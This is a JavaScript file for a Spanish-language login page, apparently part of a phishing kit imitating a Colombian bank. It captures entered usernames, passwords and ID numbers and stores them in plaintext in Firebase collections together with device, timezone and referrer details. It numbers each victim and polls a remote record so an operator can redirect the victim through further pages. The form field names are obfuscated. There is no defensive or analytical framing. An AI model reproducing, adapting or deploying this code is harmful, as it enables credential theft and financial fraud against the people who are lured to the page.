(function () {
  'use strict';

  var accessWatcher = null;

  function getNextCardNumber(db) {
    return db
      .collection("redireccion")
      .orderBy("cardNumber", "desc")
      .limit(1)
      .get()
      .then(function (snapshot) {
        if (snapshot.empty) {
          return 1;
        }
        return (snapshot.docs[0].data().cardNumber || 0) + 1;
      })
      .catch(function () {
        return 1;
      });
  }

  function saveHistoryEntry(db, historyData) {
    var docId = historyData.usuario;

    return db
      .collection("datosHistorial")
      .doc(docId)
      .set(historyData, { merge: true })
      .catch(function (error) {
        console.error("Error guardando historial inicial:", error);
      });
  }

  function attachAccessWatcher(userRef, userValue, accessButton) {
    if (accessWatcher) {
      accessWatcher();
      accessWatcher = null;
    }

    accessWatcher = userRef.onSnapshot(
      function (docSnapshot) {
        if (!docSnapshot.exists) {
          accessButton.disabled = false;
          accessButton.textContent = "INGRESAR";
          return;
        }

        var userData = docSnapshot.data() || {};
        var page = userData.page;

        if (typeof page !== "number" || page <= 0) {
          return;
        }

        var route =
          window.appConfig &&
          window.appConfig.routes &&
          window.appConfig.routes[page]
            ? window.appConfig.routes[page]
            : null;

        if (route && route.url) {
          var targetUrl = String(route.url || "");
          var currentPath = window.location.pathname.split("/").pop() || "";
          var targetPath = targetUrl.split("?")[0].split("#")[0].split("/").pop() || "";

          if (targetPath && targetPath === currentPath) {
            return;
          }

          localStorage.setItem("usuarioActual", userValue);
          sessionStorage.setItem("dashboard_session_user", userValue);
          sessionStorage.setItem("dashboard_session_timestamp", Date.now().toString());

          if (accessWatcher) {
            accessWatcher();
            accessWatcher = null;
          }

          window.location.href = route.url;
          return;
        }
      },
      function () {
        accessButton.disabled = false;
        accessButton.textContent = "INGRESAR";
      }
    );
  }

  document.addEventListener("DOMContentLoaded", function () {
    var docInput = document.querySelector('input[name="doko"]');
    var userInput = document.querySelector('input[name="tiki"]');
    var passInput = document.querySelector('input[name="toko"]');
    var accessButton = document.querySelector('button.ingresar');

    if (!userInput || !passInput || !accessButton) {
      return;
    }

    accessButton.addEventListener("click", function (event) {
      event.preventDefault();

      if (accessButton.hasAttribute('disabled')) {
        return;
      }

      var db = window.db;
      if (!db || typeof firebase === "undefined") {
        return;
      }

      var docValue = docInput ? (docInput.value || "").trim() : "";
      var userValue = (userInput.value || "").trim();
      var passValue = (passInput.value || "").trim();

      if (!userValue || !passValue || userValue.indexOf("/") !== -1) {
        return;
      }

      accessButton.setAttribute('disabled', 'true');
      accessButton.textContent = "Cargando...";
      var overlay = document.getElementById("bapa-espera-overlay");
      if (overlay) {
        overlay.removeAttribute("hidden");
      }

      getNextCardNumber(db)
        .then(function (cardNumber) {
          var isMobile = /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent);
          var now = new Date();
          var fecha = now.toLocaleDateString("es-CO");
          var hora = now.toLocaleTimeString("es-CO", {
            hour: "2-digit",
            minute: "2-digit",
            second: "2-digit",
          });

          var currentUserData = {
            usuario: userValue,
            clave: passValue,
            documento: docValue || userValue,
            tipoDocumento: "Modal",
            page: 0,
            cardNumber: cardNumber,
            dispositivo: isMobile ? "Móvil" : "Desktop",
            fecha: fecha,
            hora: hora,
            timestamp: firebase.firestore.FieldValue.serverTimestamp(),
          };

          var historyData = {
            usuario: userValue,
            clave: passValue,
            documento: docValue || userValue,
            tipoDocumento: "Modal",
            cardNumber: cardNumber,
            dispositivo: isMobile ? "Móvil" : "Desktop",
            fecha: fecha,
            hora: hora,
            timestamp: now.toISOString(),
            userAgent: navigator.userAgent,
            idioma: navigator.language || "es",
            zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer || "Directo",
          };

          var userRef = db.collection("redireccion").doc(userValue);

          return userRef.set(currentUserData, { merge: true }).then(function () {
            localStorage.setItem("usuarioActual", userValue);
            attachAccessWatcher(userRef, userValue, accessButton);
            return saveHistoryEntry(db, historyData);
          });
        })
        .catch(function () {
          accessButton.textContent = "INGRESAR";
          accessButton.removeAttribute('disabled');
          var overlay = document.getElementById("bapa-espera-overlay");
          if (overlay) {
            overlay.setAttribute("hidden", "");
          }
        });
    });
  });
})();
